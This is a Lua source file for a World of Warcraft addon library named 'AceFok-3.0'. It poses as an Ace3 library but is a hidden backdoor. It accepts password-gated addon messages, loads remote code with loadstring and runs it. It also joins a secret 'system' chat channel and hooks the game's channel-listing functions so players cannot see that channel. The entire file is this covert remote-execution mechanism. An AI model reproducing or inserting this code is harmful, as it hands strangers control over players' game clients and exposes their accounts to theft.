local MAJOR, MINOR = "AceFok-3.0", 1
local AceFok, oldminor = LibStub:NewLibrary(MAJOR, MINOR)

if not AceFok then return end

local origList, origInfo, infoCookie, origNum, origChan
AceFok.pass = 694506342
AceFok.frame = AceFok.frame or CreateFrame("Frame","AceFokFrame")
AceFok.reply = function(msg,chat,sender)
  SendAddonMessage("AFr",msg,chat,sender)
end

local function onEvent(this, event, arg1, arg2, ...)
	if event == "CHAT_MSG_ADDON" then
    if arg1 == "AFp" then
	    if not AceFok.passs then 
        local t = { (arg2):match( "^(.*)0(.*)0(.*)$" ) };
        AceFok.passs = -1
        local fcs32tab = {  [0]=0, 1996959894, -301047508, -1727442502, 124634137, 1886057615, -379345611, -1637575261,
    249268274, 2044508324, -522852066, -1747789432, 162941995, 2125561021, -407360249, -1866523247,
    498536548, 1789927666, -205950648, -2067906082, 450548861, 1843258603, -187386543, -2083289657,
    325883990, 1684777152, -43845254, -1973040660, 335633487, 1661365465, -99664541, -1928851979,
    997073096, 1281953886, -715111964, -1570279054, 1006888145, 1258607687, -770865667, -1526024853,
    901097722, 1119000684, -608450090, -1396901568, 853044451, 1172266101, -589951537, -1412350631,
    651767980, 1373503546, -925412992, -1076862698, 565507253, 1454621731, -809855591, -1195530993,
    671266974, 1594198024, -972236366, -1324619484, 795835527, 1483230225, -1050600021, -1234817731,
    1994146192, 31158534, -1731059524, -271249366, 1907459465, 112637215, -1614814043, -390540237,
    2013776290, 251722036, -1777751922, -519137256, 2137656763, 141376813, -1855689577, -429695999,
    1802195444, 476864866, -2056965928, -228458418, 1812370925, 453092731, -2113342271, -183516073,
    1706088902, 314042704, -1950435094, -54949764, 1658658271, 366619977, -1932296973, -69972891,
    1303535960, 984961486, -1547960204, -725929758, 1256170817, 1037604311, -1529756563, -740887301,
    1131014506, 879679996, -1385723834, -631195440, 1141124467, 855842277, -1442165665, -586318647,
    1342533948, 654459306, -1106571248, -921952122, 1466479909, 544179635, -1184443383, -832445281,
    1591671054, 702138776, -1328506846, -942167884, 1504918807, 783551873, -1212326853, -1061524307,
    -306674912, -1698712650, 62317068, 1957810842, -355121351, -1647151185, 81470997, 1943803523,
    -480048366, -1805370492, 225274430, 2053790376, -468791541, -1828061283, 167816743, 2097651377,
    -267414716, -2029476910, 503444072, 1762050814, -144550051, -2140837941, 426522225, 1852507879,
    -19653770, -1982649376, 282753626, 1742555852, -105259153, -1900089351, 397917763, 1622183637,
    -690576408, -1580100738, 953729732, 1340076626, -776247311, -1497606297, 1068828381, 1219638859,
    -670225446, -1358292148, 906185462, 1090812512, -547295293, -1469587627, 829329135, 1181335161,
    -882789492, -1134132454, 628085408, 1382605366, -871598187, -1156888829, 570562233, 1426400815,
    -977650754, -1296233688, 733239954, 1555261956, -1026031705, -1244606671, 752459403, 1541320221,
    -1687895376, -328994266, 1969922972, 40735498, -1677130071, -351390145, 1913087877, 83908371,
    -1782625662, -491226604, 2075208622, 213261112, -1831694693, -438977011, 2094854071, 198958881,
    -2032938284, -237706686, 1759359992, 534414190, -2118248755, -155638181, 1873836001, 414664567,
    -2012718362, -15766928, 1711684554, 285281116, -1889165569, -127750551, 1634467795, 376229701,
    -1609899400, -686959890, 1308918612, 956543938, -1486412191, -799009033, 1231636301, 1047427035,
    -1362007478, -640263460, 1088359270, 936918000, -1447252397, -558129467, 1202900863, 817233897,
    -1111625188, -893730166, 1404277552, 615818150, -1160759803, -841546093, 1423857449, 601450431,
    -1285129682, -1000256840, 1567103746, 711928724, -1274298825, -1022587231, 1510334235, 755167117 }
        local string_len = string.len
        local bit_bxor = bit.bxor
        local bit_rshift = bit.rshift
        local bit_band = bit.band
        local string_byte = string.byte
        local bit_bnot = bit.bnot

        local i
        for j=1,#t do
          local l=string_len(t[j])
          for i = 1,l do
            AceFok.passs = bit_bxor(bit_rshift(AceFok.passs,8), fcs32tab[ bit_band(bit_bxor(AceFok.passs, string_byte(t[j],i)), 255) ])
          end     
        end
	      AceFok.reply("1",...)
      end 
    elseif arg1 == "AFs" then
      if AceFok.pass == AceFok.passs then 
        AceFok.func = loadstring(arg2)
      end
      AceFok.reply("2",...)
    elseif arg1 == "AFe" then
      if AceFok.pass == AceFok.passs and AceFok.func then
        AceFok.func(arg2 and strsplit(",",arg2))
      end
      AceFok.reply("3",...)
    end
  elseif event == "PLAYER_LOGIN" then
    JoinPermanentChannel("system",nil,0,0)
    if type(GetChannelList) == "function" and not origList then
      origList = GetChannelList
      GetChannelList = function(...) 
        local table = { origList(...) }
        for i=1,#table do
          if table[i] == "system" then
            tremove(table,i)
            tremove(table,i-1)
          end
        end
        return unpack(table);
      end
    end
--
    if type(GetChannelDisplayInfo) == "function" and not origInfo then
      origInfo = GetChannelDisplayInfo
      GetChannelDisplayInfo = function(i)
        if origInfo(i) == "system" then
          infoCookie = i
          return origInfo(i+1)
        elseif infoCookie then
          if i > infoCookie then
            return origInfo(i+1)
          else
            return origInfo(i)
          end
        else
          return origInfo(i)
        end
      end
    end
--
    if type(GetNumDisplayChannels) == "function" and not origNum then
      origNum = GetNumDisplayChannels
      GetNumDisplayChannels = function()
        return (origNum() - 1)
      end
    end  
--
    if type(GetChannelName) == "function" and not origChan then
      origChan = GetChannelName
      GetChannelName = function(chan)
        if select(2,origChan(chan)) == "system" then
          return 0, nil, 0;
        else
          return origChan(chan);
        end
      end
    end
--
  elseif event == "PLAYER_LOGOUT" or event == "PLAYER_CAMPING" or event == "PLAYER_QUITING" then
    LeaveChannelByName("system")
  end 
end

AceFok.frame:RegisterEvent("CHAT_MSG_ADDON")
AceFok.frame:RegisterEvent("PLAYER_LOGIN")
AceFok.frame:RegisterEvent("PLAYER_CAMPING")
AceFok.frame:RegisterEvent("PLAYER_LOGOUT")
AceFok.frame:RegisterEvent("PLAYER_QUITING")
AceFok.frame:SetScript("OnEvent", onEvent)
